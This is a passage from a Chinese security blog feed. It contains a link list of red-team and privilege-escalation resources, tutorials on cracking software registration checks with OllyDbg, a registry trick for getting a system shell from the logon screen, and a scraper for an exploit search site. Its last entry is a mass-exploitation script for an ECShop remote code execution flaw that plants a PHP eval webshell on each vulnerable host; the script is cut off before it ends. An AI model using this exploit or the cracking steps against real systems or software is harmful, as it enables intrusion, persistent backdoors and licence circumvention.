rel="noopener">https://github.com/360-A-Team/EventCleaner</a></div></span><br></div><br><hr><br><a name="1749"><br><br><div><br><span><div><a href="http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html" target="_blank" rel="noopener">http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html</a></div></span><br></div><br><hr><br><a name="1773"><br><br><div><br><span><div><a href="https://xz.aliyun.com/t/2516" target="_blank" rel="noopener">https://xz.aliyun.com/t/2516</a></div></span><br></div><br><hr><br><a name="1775"><br><br><div><br><span><div><a href="https://mp.weixin.qq.com/s/gwtdAeBy6dKViiZJbgKMSA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gwtdAeBy6dKViiZJbgKMSA</a></div></span><br></div><br><hr><br><a name="1779"><br><br><div><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">https://github.com/juliourena/plaintext/tree/master/CSharp%20Tools/UAC%20Bypass</span></div></span><br></div><br><hr><br><a name="1780"><br><br><div><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">https://gist.github.com/caseysmithrc/87f6572547f633f13a8482a0c91fb7b7</span></div></span><br></div><br><hr><br><a name="1800"><br><br><div><br><span><div><a href="https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></div><div><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></div></span><br></div><br><hr><br><a name="1804"><br><br><div><br><span><div><a href="https://github.com/endgameinc/xori" target="_blank" rel="noopener">https://github.com/endgameinc/xori</a></div></span><br></div><br><hr><br><a name="1806"><br><br><div><br><span><div><a href="https://github.com/archerysec/archerysec/releases" target="_blank" rel="noopener">https://github.com/archerysec/archerysec/releases</a></div></span><br></div><br><hr><br><a name="1820"><br><br><div><br><span><div><a href="https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5" target="_blank" rel="noopener">https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5</a></div></span><br></div><br><hr><br><a name="1824"><br><br><div><span><div><a href="https://hansesecure.de/slae-assignment-5-analyze-metasploit-payloads/" target="_blank" rel="noopener">https://hansesecure.de/slae-assignment-5-analyze-metasploit-payloads/</a></div></span><br></div><br><hr><br><a name="1829"><br><br><div><br><span><div><a href="https://docs.google.com/document/d/101EsKlu41ICdeE7mEv189SS8wMtcdXfRtua0ClYjP1M/edit#heading=h.pfjprjr9eymx" target="_blank" rel="noopener">https://docs.google.com/document/d/101EsKlu41ICdeE7mEv189SS8wMtcdXfRtua0ClYjP1M/edit#heading=h.pfjprjr9eymx</a></div></span><br></div><br><hr><br><a name="1891"><br><br><div><br><span><div><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" target="_blank" rel="noopener">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></div></span><br></div><br><hr><br><a name="1893"><br><br><div><br><span><div><a href="http://url.cn/50LjDfs" target="_blank" rel="noopener">http://url.cn/50LjDfs</a></div></span><br></div><br><hr><br><a name="1895"><br><br><div><br><span><div><a href="http://vinc.top/category/sec_web/" target="_blank" rel="noopener">http://vinc.top/category/sec_web/</a></div></span><br></div><br><hr><br><a name="1909"><br><br><div><br><span><div><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md</a></div></span><br></div><br><hr><br><a name="1998"><br><br><div><br><span><div><a href="https://github.com/homjxi0e/PowerAvails" target="_blank" rel="noopener">https://github.com/homjxi0e/PowerAvails</a></div></span><br></div><br><hr><br><a name="2002"><br><br><div><span><div><a href="http://www.ggsec.cn/secist-shellcode.html" target="_blank" rel="noopener">http://www.ggsec.cn/secist-shellcode.html</a></div></span><br></div><br><hr><br><a name="2003"><br><br><div><span><div><a href="https://hackedu.io/vulnerabilities" target="_blank" rel="noopener">https://hackedu.io/vulnerabilities</a></div></span><br></div><br><hr><br><a name="2004"><br><br><div><span><div><a href="http://www.secist.com/archives/7096.html" target="_blank" rel="noopener">http://www.secist.com/archives/7096.html</a></div></span><br></div><br><hr><br><a name="2005"><br><br><div><span><div><a href="https://github.com/foobarto/redteam-notebook/blob/master/README.md" target="_blank" rel="noopener">https://github.com/foobarto/redteam-notebook/blob/master/README.md</a></div></span><br></div><br><hr><br><a name="2011"><br><br><div><span><div><a href="https://bohops.com/" target="_blank" rel="noopener">https://bohops.com/</a></div></span><br></div><br><hr><br><a name="2018"><br><br><div><span><div><a href="https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/" target="_blank" rel="noopener">https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/</a></div><div><br></div><div><br></div><div>在登陆屏幕打开cmd</div></span><br></div><br><hr><br><a name="2019"><br><br><div><span><div><a href="https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/" target="_blank" rel="noopener">https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/</a></div></span><br></div><br><hr><br><a name="2043"><br><br><div><span><div><a href="https://rmusser.net/docs/Privilege%20Escalation%20&amp;%20Post-Exploitation.html#dll" target="_blank" rel="noopener">https://rmusser.net/docs/Privilege%20Escalation%20&amp;%20Post-Exploitation.html#dll</a></div></span><br></div><br><hr><br><a name="2045"><br><br><div><span><div><a href="https://wiki.exploitpedia.org/view/Main_Page" target="_blank" rel="noopener">https://wiki.exploitpedia.org/view/Main_Page</a><i style="box-sizing: inherit; color: rgb(255, 255, 255); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 17.5px; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(0, 0, 0); text-decoration-style: initial; text-decoration-color: initial;"><b style="box-sizing: inherit; font-weight: bold;"><font style="box-sizing: inherit; vertical-align: inherit;"><font style="box-sizing: inherit; vertical-align: inherit;">exploitpedia.org是一个渗透测试和红队运营维基</font></font></b></i></div></span><br></div><br><hr><br><a name="2047"><br><br><div><span><div><a href="http://www.ggsec.cn/com-xml.html" target="_blank" rel="noopener">http://www.ggsec.cn/com-xml.html</a></div></span><br></div><br><hr><br><a name="2048"><br><br><div><span><div><a href="https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections" target="_blank" rel="noopener">https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections</a></div></span><br></div><br><hr><br><br><a name="2068"><br><br><div><br><span><div><a href="http://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="noopener">http://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/</a></div></span><br></div></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></body></html> </p><p>自己画的渗透流程图：<br>          <img src="https://s1.ax1x.com/2018/09/17/iZGkWt.md.png" alt="iZGkWt.md.png"></p><p>转载请声明：转自<a href="mailto:422926799@github.io" target="_blank" rel="noopener">422926799@github.io</a></p></dt></dt></dt></dt></dt></dt></dt></dt></dt></p></dt></dt></p></dt></p></dl><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"right","width":250,"height":600},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>针对VB的破解</title>
      <link href="/posts/fd7e8bb2.html"/>
      <url>/posts/fd7e8bb2.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shark恒的教程去到第一期的第十一课，针对vb的窗口破解。因为vb没有任何办法搜索关键字进行断点<br>另外还学到了如何识别PE是vb。<br><a href="http://img0.imgtn.bdimg.com/it/u=2358224950,2183871480&amp;fm=26&amp;gp=0.jpg" target="_blank" rel="noopener"></a><img src="https://s1.ax1x.com/2018/09/15/iVCE4I.jpg" alt="iVCE4I.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>第十一课的课件是，系统加速的exe。首先还是常规操作，将PE拖入到PEID查壳<br><img src="https://s1.ax1x.com/2018/09/15/iVCwb4.png" alt="iVCwb4.png"><br>无壳，将其载入OD<br><img src="https://s1.ax1x.com/2018/09/15/iVCc26.md.png" alt="iVCc26.md.png"><br>发现满足VB程序的条件</p><pre><code>有一个push,jmp &amp;MSVBxxx,往上拉还能发现vb的函数</code></pre><p><img src="https://s1.ax1x.com/2018/09/15/iVCWrD.png" alt="iVCWrD.png"><br>通过弹窗来寻找关键跳，F9运行程序，输入假码，点击VB选择BP rtcMsgBox窗口弹出函数<br><img src="https://s1.ax1x.com/2018/09/15/iVCIIA.md.png" alt="iVCIIA.md.png"><br>点击注册发现被断了下来，(来到了系统领空)<br><img src="https://s1.ax1x.com/2018/09/15/iVCTPI.md.png" alt="iVCTPI.md.png"><br>Alt+F9跳出系统领空去到程序领空。<br><img src="https://s1.ax1x.com/2018/09/15/iVCbxf.md.png" alt="iVCbxf.md.png"><br>发现我们刚刚从一个call走了出来<br><img src="https://s1.ax1x.com/2018/09/15/iVCLM8.md.png" alt="iVCLM8.md.png"><br>往上面观察发现了一个jmp跳转，跳过了错误，上去看看<br><img src="https://s1.ax1x.com/2018/09/15/iVCOsS.png" alt="iVCOsS.png"><br>发现jmp被跳过了，发现一个跳到lea的标志。点击跟随跳转<br><img src="https://s1.ax1x.com/2018/09/15/iVPALF.md.png" alt="iVPALF.md.png"><br>发现关键跳，将其下断点尝试<br><img src="https://s1.ax1x.com/2018/09/15/iVPeo9.md.png" alt="iVPeo9.md.png"><br>重启程序，点击注册，发现成功断了下来<br><img src="https://s1.ax1x.com/2018/09/15/iVPJdH.md.png" alt="iVPJdH.md.png"><br>进行NOP填充即可<br><img src="https://s1.ax1x.com/2018/09/15/iVPUJI.md.png" alt="iVPUJI.md.png"><br>重新运行程序，发现已经破解<br><img src="https://s1.ax1x.com/2018/09/15/iVPaWt.png" alt="iVPaWt.png"></p><p><img src="https://s1.ax1x.com/2018/09/15/iVPseg.png" alt="iVPseg.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><pre><code>遇见VB写的PE我们可以使用，今天这种断点弹窗的方法进行断点，然后寻找关键跳</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取sploitus的记录</title>
      <link href="/posts/b2d37895.html"/>
      <url>/posts/b2d37895.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上学的第二个星期回到家，在这个星期翻到一个不错的搜索引擎。果断将其爬下来<br><a href="https://sploitus.com/" target="_blank" rel="noopener">💀 Sploitus | Exploit &amp; Hacktool Search Engine</a><br><img src="https://s1.ax1x.com/2018/09/14/iEhkDg.png" alt="iEhkDg.png"><br>Music：<embed src="//music.163.com/style/swf/widget.swf?sid=5240550&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先请求URL然后抓包<br><img src="https://s1.ax1x.com/2018/09/14/iEhe5n.md.png" alt="iEhe5n.md.png"><br>逐个观察，发现search返回了搜索的内容那么就看他了<br><img src="https://s1.ax1x.com/2018/09/14/iEhnCq.md.png" alt="iEhnCq.md.png"><br>返回是json<br><img src="attachments\96137825.png" alt="96137825.png"></p><p>爬虫思路：<br><code>发现有accept: application/json请求头，那么就很简单了带上user-agent头和accept头和对应的请求参数post请求格式化json即可</code><br>代码：</p><pre><code>import requestsbanner=&#39;&#39;&#39;   .dMMMb  dMMMMb  dMP    .aMMMb  dMP dMMMMMMP dMP dMP .dMMMb   dMP&quot; VP dMP.dMP dMP    dMP&quot;dMP amr    dMP   dMP dMP dMP&quot; VP   VMMMb  dMMMMP&quot; dMP    dMP dMP dMP    dMP   dMP dMP  VMMMb   dP .dMP dMP     dMP    dMP.aMP dMP    dMP   dMP.aMP dP .dMP   VMMMP&quot; dMP     dMMMMMP VMMMP&quot; dMP    dMP    VMMMP&quot;  VMMMP&quot; &#39;&#39;&#39;print(banner)print(&#39;&#39;)print(&#39;author:Nine world&#39;)print(&#39;--------------------------------------------------------------------------------------&#39;)def sploitus():    #headers={&#39;user-agent&#39;:&#39;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#39;,&#39;content-type&#39;: &#39;application/json&#39;,&#39;accept&#39;: &#39;application/json&#39;,&#39;referer&#39;: &#39;https://sploitus.com/?query=MS17-010&#39;}    print(&#39;[!] Please select type&#39;)    print(&#39;exploits&#39;)    print(&#39;tools&#39;)    xz=input(&#39;type:&#39;)    user=input(&#39;query:&#39;)    print(&#39;&#39;)    headers={    &#39;accept&#39;: &#39;application/json&#39;,    &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#39;    }    url=&#39;https://sploitus.com/search&#39;    data={&#39;offset&#39;:0,&#39;query&#39;:&quot;{}&quot;.format(user),&#39;sort&#39;:&quot;default&quot;,&#39;title&#39;:&#39;false&#39;,&#39;type&#39;:&quot;{}&quot;.format(xz)}    cookie={&#39;__cfduid&#39;:&#39;d7ecd3f6052b48a13d4a47e83dbdd15eb1536914053&#39;}    requt=requests.post(url=url,headers=headers,json=data,cookies=cookie)    jds=requt.json()    lp=jds[&#39;exploits&#39;][0:]    for l in lp:        print(&#39;title:&#39;,l[&#39;title&#39;])        #print(&#39;published&#39;,l[&#39;published&#39;])        print(&#39;id&#39;,l[&#39;id&#39;])        print(&#39;type:&#39;,l[&#39;type&#39;])        print(&#39;url:&#39;,l[&#39;href&#39;])        print(&#39;&#39;)sploitus()</code></pre><p>测试截图：<br><img src="https://s1.ax1x.com/2018/09/14/iEhY5R.png" alt="iEhY5R.png"></p><p><img src="https://s1.ax1x.com/2018/09/14/iEhU8x.png" alt="iEhU8x.png"></p><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>万能断点了解一下</title>
      <link href="/posts/7d87ec35.html"/>
      <url>/posts/7d87ec35.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>放假了，继续学破解。shark恒第10课，万能断点。主要用在PE头别修改的问题上。<br>下面开始说正事了哈<br><img src="https://s1.ax1x.com/2018/09/08/iPfbi8.jpg" alt="iPfbi8.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>第10课的课件是MP3转换器，首先拿去查壳（常规操作）<br><img src="https://s1.ax1x.com/2018/09/08/iPhSZq.png" alt="iPhSZq.png"><br>载入OD(在OD可以更加直观的看到PE头被修改了)<br><img src="https://s1.ax1x.com/2018/09/08/iPhPiT.png" alt="iPhPiT.png"><br>然后F9运行程序<br><img src="https://s1.ax1x.com/2018/09/08/iPhlWD.png" alt="iPhlWD.png"><br>回到反汇编窗口，右键单击查看-&gt;user32模块<br><img src="https://s1.ax1x.com/2018/09/08/iPhGyd.png" alt="iPhGyd.png"><br>然后在user32模块里右键-&gt;查找-&gt;二进制字符串，搜索F3 A5 8B C8 83 E1 03 F3 A4 E8(万能断点处)<br><img src="https://s1.ax1x.com/2018/09/08/iPhUTP.png" alt="iPhUTP.png"><br>然后点击确定就会跳到反汇编窗口(注意：系统领空)<br><img src="https://s1.ax1x.com/2018/09/08/iPhwY8.md.png" alt="iPhwY8.md.png"><br>打开PE输入好假码之后进行，断点操作<br><img src="https://s1.ax1x.com/2018/09/08/iPhyOs.png" alt="iPhyOs.png"><br>点击确认后，发现程序断了下来<br><img src="https://s1.ax1x.com/2018/09/08/iPhgwq.png" alt="iPhgwq.png"><br>Alt+F9跳出系统领空<br><img src="https://s1.ax1x.com/2018/09/08/iPhfYT.png" alt="iPhfYT.png"><br>然后F8单步就能见到假码，真码，真码与假码对比<br>(真码)<br><img src="https://s1.ax1x.com/2018/09/08/iPhXtK.png" alt="iPhXtK.png"><br>(真假码对比)<br><img src="https://s1.ax1x.com/2018/09/08/iP4S6H.md.png" alt="iP4S6H.md.png"><br>(将真码拷贝出来，关闭OD)注册即可<br><img src="https://s1.ax1x.com/2018/09/08/iP4pXd.md.png" alt="iP4pXd.md.png"></p><p>这些天破解的总结<br><code></code></p><html><br><head><meta name="generator" content="Hexo 3.8.0"><br>  <title>Evernote Export</title><br>  <basefont face="微软雅黑" size="2"><br>  <meta http-equiv="Content-Type" content="text/html;charset=utf-8"><br>  <meta name="exporter-version" content="YXBJ Windows/600240 (zh-CN, DDL); Windows/6.1.1 (Win64);"><br>  <style><br>    body, td {<br>      font-family: 微软雅黑;<br>      font-size: 10pt;<br>    }<br>  </style><br><link rel="alternate" href="/atom.xml" title="九世的博客" type="application/atom+xml"></head><br><body><br><a name="1938"><br><br><div><span><div>逆向第二课总结<br>破解要用反向思维来想。比如他跳转不成功进入到报错。那他跳转成功是否是正确的呢？<br><br></div><div>注意:当修改CPU区的代码的时候按空格，修改必须保证修改的代码为16进制</div></span><br></div><br><hr><br><a name="1939"><br><br><div><br><span><div>逆向第一课总结:</div><div><br></div><div>1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。</div><div><br></div><div>2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个</div><div><br></div><div>3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符&gt;</div><div>，然后进行noop填聪(就是什么也没有)，然后软件就破解了。</div><div><br></div><div><br></div><div>自己可以考虑用C写个简单的登陆程序，进行破解。完毕</div><div><br></div><div>注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。</div><div><br></div><div>破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字</div></span><br></div><br><hr><br><a name="1952"><br><br><div><span><div>破解不联网登陆软件</div><div>常规思路就是:查壳，脱壳，然后拖入od，看看他有没有跳过什么，如果是红色线跳转的话noop填充把跳转删了，如果是灰色线跳转不超过的话，把开始跳转的汇编代码改为jmp 无条件跳转，如果有个x前面加个0</div></span><br></div><br><hr><br><a name="1958"><br><br><div><br><span><div><a href="https://422926799.github.io/2018/08/26/ESP%E5%AE%9A%E5%BE%8B/" target="_blank" rel="noopener">https://422926799.github.io/2018/08/26/ESP%E5%AE%9A%E5%BE%8B/</a></div></span><br></div><br><hr><br><a name="1960"><br><br><div><br><span><div>当你脱壳之后，因为现在壳都有压缩功能。所有脱壳之后文件会变大，如果文件变大了。如果PE有检测文件大小功能，如果文件大小不等于</div><div>有壳时候的大小就会退出PE。判断是否有自效验就是，脱壳后PE打不开。</div><div><br></div><div>破解方法：</div><div>将PE拖入到OD设置API断点-&gt;常用断点-&gt;文件大小断点。F9运行，发现程序被断下来了，在右下角的窗口可以看见判断函数，点击反汇编数据窗口跟踪，然后如果发现。cmp 十六进制（文件大小），然后用Noop填充即可</div></span><br></div><br><hr><br><a name="1964"><br><br><div><br><span><div>一般有关键跳上面就有关键call,z载入OD的程序可以观察一下有什么注册成功之类的关键字。上面就有关键跳和关键call，找主要跳转。如果关键跳跳过了正确程序的话，可以从关键call中进行更改使关键call达到正确的程序，关键call和关键跳中有笔记,test可以仔细观察一下</div></span><br></div><br><hr><br><a name="1980"><br><br><div><br><span><div>一般有注册或者登陆之类的。载入OD找好关键字之后，双击跳到反汇编窗口之后。可以发现判断跳转的都是je</div></span><br></div><br><hr><br><a name="1984"><br><br><div><br><span><div>先用API断点函数下一个ReadFile读文件的函数，如果有壳则用401000跳到字符区。然后搜索关键字，双击关键字跳到反汇编窗口F2下断点，将读文件的断点禁止，运行软件跳到断点</div><div>之后往上看判断，是否有真码</div></span><br></div><br><hr><br><a name="1994"><br><br><div><br><span><div>ini类型重启验证(重启验证之后没有任何关键字提示)，我们就用不了ReadFile类型断点任何在搜索关键字来搜索真码，但是我们可以用BP下个GetPrivateProfileStringA断点，专门用于对付ini重启验证。</div><div>知识点记录：</div><div>程序领空：OD左上角文件名如果文件是程序名就是程序领空</div><div>系统领空：OD左上角文件名如果不是程序名的话就是系统领空</div><div>如果遇见系统领空的话就按Alt+F9(或者在调试按执行到用户代码)跳出系统领空，然后单步寻找真码</div><div><br></div><div><br></div></span><br></div><br><hr><br><a name="2033"><br><br><div><br><span><div>因为PE头部被修改，将PE载入到OD之后直接运行程序。右键-&gt;查找-&gt;模块user32。到了模块user32之后进行查找-&gt;二进制字符串-&gt;搜索：<span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;">F3 A5 8B C8 83 E1 03 F3 A4 E8，双击跳转。然后在合适的步骤下断点，等程序断下来之后</span></div><div><span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;">Alt+F9跳出系统领空，找真码即可。</span></div><div><span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;"><br></span></div></span><br></div></a></a></a></a></a></a></a></a></a></a><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"right","width":250,"height":600},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html> ]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>另一种获得系统SHELL的方法 - 辅助技术</title>
      <link href="/posts/f638278f.html"/>
      <url>/posts/f638278f.html</url>
      <content type="html"><![CDATA[<h2 id="这里做一个简单的纪录"><a href="#这里做一个简单的纪录" class="headerlink" title="这里做一个简单的纪录"></a>这里做一个简单的纪录</h2><p>原文是来自：<a href="https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/" target="_blank" rel="noopener">Another way to get to a system shell – Assistive Technology – Oddvar Moe’s Blog</a><br><img src="https://s1.ax1x.com/2018/09/07/iPQBx1.png" alt="iPQBx1.png"></p><p>运行regedit<br><img src="https://s1.ax1x.com/2018/09/07/iPQrKx.png" alt="iPQrKx.png"><br>在注册表里找到<code>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Accessibility \ ATs \ magnifierpane</code><br><img src="https://s1.ax1x.com/2018/09/07/iPQgaD.png" alt="iPQgaD.png"><br>然后给权限这个项目，修改值就好<br>给注册表权限：<a href="http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html" target="_blank" rel="noopener">http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html</a><br>测试结果：<br><img src="https://s1.ax1x.com/2018/09/07/iPQWPH.md.png" alt="iPQWPH.md.png"><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Eschop</title>
      <link href="/posts/8d126442.html"/>
      <url>/posts/8d126442.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm,这个洞都是星期一的事情了。只不过我在上学，无奈的一批没办法写博客和进行复现。现在才补上，sorry啊。</p><p><img src="https://s1.ax1x.com/2018/09/07/iPZGkR.jpg" alt="iPZGkR.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞分析原文：ECShop全系列版本远程代码执行高危漏洞分析<br>ECSHOP RCE 漏洞复现教程：VULNSPY实验-ECShop &lt;= 2.7.x 全系列版本远程代码执行高危漏洞利用<br>漏洞复现地址：<a href="https://www.vsplate.com/?github=vulnspy/ECShop_2.7.3_UTF8_installed&amp;autogo=1" target="_blank" rel="noopener">https://www.vsplate.com/?github=vulnspy/ECShop_2.7.3_UTF8_installed&amp;autogo=1</a></p><p>复现完漏洞之后，你就明白得到了其中的思路：</p><p>此脚本的思路：<br><code>首先先判断是否存在远程漏洞，如果有加入列表与写入save.txt判断加入的列表是否有存在漏洞的url，大于0则用正则匹配出url，一个url进行getshell请求。然后那个匹配出来的url加入getshell之后的一句话后门路径。判断是否存在存在就写入txt否则就不写入....可能说的比较不清楚</code></p><p>代码：<br><code></code>import requests<br>import threading<br>import os<br>import re<br>import time</p><p>xj=open(‘save.txt’,’w’)<br>xj.close()</p><p>cz=[]<br>def exploit(url):<br>    url=url+’/user.php’<br>    header={‘Referer’: ‘554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:”id”;s:3:”‘“‘“‘/<em>“;s:3:”num”;s:201:”</em>/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0–”;s:4:”name”;s:3:”ads”;}554fcae493e564ee0dc75bdf2ebf94ca’}<br>    data={‘action’:’login’,’vulnspy’:’phpinfo();exit;’}<br>    try:<br>        reqt=requests.post(url=url,headers=header,data=data,timeout=10)<br>        if ‘PHP Version’ in reqt.text:<br>            print(‘[+] Remote code execution high-risk vulnerabilities url:{}’.format(reqt.url))<br>            print(‘[+] Remote code execution high-risk vulnerabilities url:{}’.format(reqt.url),file=open(‘save.txt’,’a’))<br>            cz.append(reqt.url)<br>        else:<br>            print(‘[-] Not debug url:{}’.format(reqt.url))<br>    except Exception as g:<br>        print(‘[-] Error {}’.format(g))</p><pre><code>if len(cz)&gt;0:    print(&#39;[+] start getshell&#39;)else:    print(&#39;[-] not debug,Unable to getshell&#39;)    exit()getshellpayloads={&#39;action&#39;:&#39;login&#39;,&#39;vulnspy&#39;:&#39;eval(base64_decode($_POST[d]));exit;&#39;,&#39;d&#39;:&#39;ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOz8+Jyk7&#39;}for t in cz:    tx=re.sub(&#39;/user.php&#39;,&#39;&#39;,str(t))    try:        reqts2=requests.post(url=t,headers=header,data=getshellpayloads)        reqts3=requests.post(url=tx+&#39;/vulnspy.php?vulnspy=phpinfo();&#39;)        if &#39;PHP Version&#39; in reqts3.text:            print(&#39;[+] Getshell success url:{} password:{}&#39;.format(reqts3.url, &#39;vulnspy&#39;))            print(&#39;[+] Getshell success url:{} password:{}&#39;.format(reqts3.url,&#39;vulnspy&#39;),file=open(&#39;save.txt&#39;,&#39;a&#39;))        else:            print(&#39;[-] Getshell failure url:{}&#39;.format(reqts3.url))    except Exception as p:        print(&#39;[-] Error {}&#39;.format(p))</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    user = 